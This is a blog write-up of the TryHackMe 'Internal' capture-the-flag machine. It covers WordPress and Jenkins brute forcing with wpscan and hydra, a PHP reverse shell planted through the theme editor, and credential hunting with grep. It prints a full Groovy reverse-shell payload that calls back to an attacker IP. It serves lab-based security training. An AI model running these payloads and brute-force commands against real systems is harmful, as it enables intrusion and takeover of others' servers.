---
title: TryHackMe Internal Writeup
date: 2023-07-04T18:50:06.913Z
description: "A writeup of my solution for the TryHackMe 'Internal' machine "
---
## Reconnaissance

Starting off with an `nmap`scan of the target which, for me, is the address `10.10.95.248`

```shell
$ nmap -sV 10.10.95.248
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-09 12:21 EST
Nmap scan report for 10.10.95.248
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this we can deduce that an Apache web server is running on HTTP port 80, as well as an OpenSSH instance running on port 22. We can start checking out the Apache server by navigating to `http://10.10.95.248` in a browser.

## Exploring The Web Server

When we navigate to this page we are presented with the default Apache landing page, as shown below.

![](/img/apache-landing-page.png)

We can use a tool called `dirsearch`to discover endpoints / routes on the webserver. The tool will try a series of commonly used endpoints from a wordlist.

```shell
$ dirsearch -u http://10.10.95.248
```

```
[12:23:25] Starting: 
[12:23:27] 403 -  277B  - /.ht_wsr.txt                                     
[12:23:27] 403 -  277B  - /.htaccess.bak1
[12:23:27] 403 -  277B  - /.htaccess.orig
[12:23:27] 403 -  277B  - /.htaccess.sample
[12:23:27] 403 -  277B  - /.htaccess.save
[12:23:27] 403 -  277B  - /.htaccess_extra
[12:23:27] 403 -  277B  - /.htaccess_orig
[12:23:27] 403 -  277B  - /.htaccess_sc
[12:23:27] 403 -  277B  - /.htaccessBAK
[12:23:27] 403 -  277B  - /.htaccessOLD
[12:23:27] 403 -  277B  - /.htaccessOLD2
[12:23:27] 403 -  277B  - /.htm                                            
[12:23:27] 403 -  277B  - /.html
[12:23:27] 403 -  277B  - /.htpasswd_test
[12:23:27] 403 -  277B  - /.httr-oauth
[12:23:27] 403 -  277B  - /.htpasswds
[12:23:28] 403 -  277B  - /.php                                            
[12:23:39] 301 -  311B  - /blog  ->  http://10.10.95.248/blog/              
[12:23:42] 200 -    4KB - /blog/wp-login.php                                
[12:23:42] 200 -   53KB - /blog/                                            
[12:23:46] 200 -   11KB - /index.html                                       
[12:23:47] 301 -  317B  - /javascript  ->  http://10.10.95.248/javascript/  
[12:23:52] 200 -   13KB - /phpmyadmin/doc/html/index.html                   
[12:23:52] 301 -  317B  - /phpmyadmin  ->  http://10.10.95.248/phpmyadmin/  
[12:23:54] 200 -   10KB - /phpmyadmin/index.php                             
[12:23:54] 200 -   10KB - /phpmyadmin/                                      
[12:23:56] 403 -  277B  - /server-status                                    
[12:23:56] 403 -  277B  - /server-status/                                   
[12:24:03] 200 -    4KB - /wordpress/wp-login.php
```

We notice that there is a `/blog` route that we can go to, let's look at that in the web browser.

![](/img/wordpress.png)

We are presented with a `Wordpress`site (can be deduced from `Wappalyzer`tool). At the bottom of the site, there is a login link which takes us to a Wordpress login page.

![](/img/login.png)

## Brute-Forcing Wordpress Login

From looking at the author of the post of the home page, we know that there is a user called `admin`. Let's try brute forcing the Wordpress login page with the `admin` username, and passwords from `rockyou.txt`. `wpscan`has brute-force capability built-in to the tool, so let's use that

```shell
$ wpscan --url http://10.10.95.248/blog --usernames admin \
         --passwords /home/kali/wordlists/rockyou.txt
```

We got a successful pair of credentials!

![](/img/validpasswordfound.png)

Using these, we can now log into the adminstrator panel.

## Exploiting Wordpress

A pretty common method for gaining a reverse shell that I have used in the past is using the theme editor in the administrator panel to overwrite a page, for example the 404 page, to use PHP and call back to a listener, so let's do that.

Under `Appearance > Theme Editor > 404 Template (404.php),` we can paste a PHP reverse shell in, modify the variables to our machines address, and set up a listener.

[Here ](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)is the PHP reverse shell that I used

![](/img/variables.png)

Now set up a listener on your kali machine:

```shell
$ nc -lvnp 1337
listening on [any] 1337 ...
```

And navigate to `http://10.10.95.248/blog/wp-content/themes/twentyseventeen/404.php`. You should see a terminal call back to your reverse shell. Running `whoami` on the shell tells us we are currently`www-data`, which is a common account for web servers to run in.

## Breaking out of www-data

Having a poke around the filesystem, there is a user called `aubreanna`on the system (/home contains a user directory for aubreanna). We can use grep to see if there are any files on the system which contain aubreanna's username. When I first did this, I did not redirect STDERR to `/dev/null`, and as such, saw a lot of permission denied errors which crashed my shell, after restarting the shell and redirecting STDERR (as shown in next command), I found aubreanna's credentials in a folder called `/opt/wp-save.txt.`

```shell
$ whoami
www-data
$ ls -a /home
.
..
aubreanna
$ grep -rnw '/' -e 'aubreanna'
/opt/wp-save.txt:5:aubreanna:bubb13guM!@#123
```

## Logging in & User Flag

With Aubreanna's username and password, we can try and SSH into the machine.

```shell
$ ssh aubreanna@10.10.95.248
...
aubreanna@10.10.95.248 s password: bubb13guM!@#123
...
aubreanna@internal:~$
```

The user flag is in its normal place, `/home/aubreanna.`

```
THM{.................}
```

# Privilege Escalation to Root

Within Aubreanna's home directory, there is also a file called `jenkins.txt`, I tried researching what Jenkins is and trying to scan the version for vulnerabilites, but I didn't really get anywhere. The file indicates that there is an internal Jenkins service running on 172.17.0.2:8080. In order to see this service from our kali machine, we will need to redirect the address to make it visible, we can do this with the SSH command's port forwarding (`-L` flag).

```shell
$ ssh -L 7654:172.17.0.2:8080 aubreanna@10.10.95.248
...
```

Once this command is run, you can navigate to `localhost:7654` and see the Jenkins login page.

![](/img/jenkins-login.png)

I didn't have any luck trying the administrator credentials from Wordpress, nor with Aubreanna's credentials. Not even the default credentials work! Time for an old fashioned brute force. Since the service is exposed to us thanks to the SSH port forwarding, I can just use hydra to brute force localhost on port 7654. We will need the POST request parameter names in order to use hydra correctly, these can be found by opening the browser's developer tools and monitoring the network tab to retreive the endpoint, and the parameter names. We will stick with the default Jenkins admin username (`admin`)

![](/img/parameters.png)

The endpoint the login request was send to was `j_acegi_security_check.` Therefore, the hydra command will look as follows:

```shell
$ hydra localhost -s 7654 -V -f http-form-post \
      "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" \ 
      -l admin -P /usr/share/wordlists/rockyou.txt
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
...
[ATTEMPT] target 127.0.0.1 - login "admin" - pass "spongebob" - 1 of 1 [child 0] (0/0)
[STATUS] 1.00 tries/min, 1 tries in 00:01h, 1 to do in 00:01h, 1 active
[7654][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
...
```

We got some credentials! Let's log in.

After looking around online for root esclation from an administrative Jenkins user, I found that you can use the Script Console feature (`Manage Jenkins > Script Console`) to create a reverse shell. Below is the payload that I found online ([link](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)) for the shell. Obviously, change your host and port accordingly.

```java
String host='10.14.32.102';
int port=5555;
String cmd='bash';
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```shell
$ nc -lvp 5555
listening on [any] 5555 ...
connect to [10.14.32.102] from internal.thm [10.10.95.248]
whoami
jenkins
```

Doing the same trick as earlier (which is so helpful, so often), we can use grep to look for any information about 'root'. Remember to redirect STDERR

```shell
$ grep -rnw '/' -e 'root' 2>/dev/null
/opt/note.txt:4:need access to the root user account.
/opt/note.txt:6:root:tr0ub13guM!@#123
```

Now, let's use these creds to SSH in as root!

```shell
$ ssh root@10.10.95.248
root@10.10.95.248 s password: tr0ub13guM!@#123
$ cat root.txt
.........
```

Finished!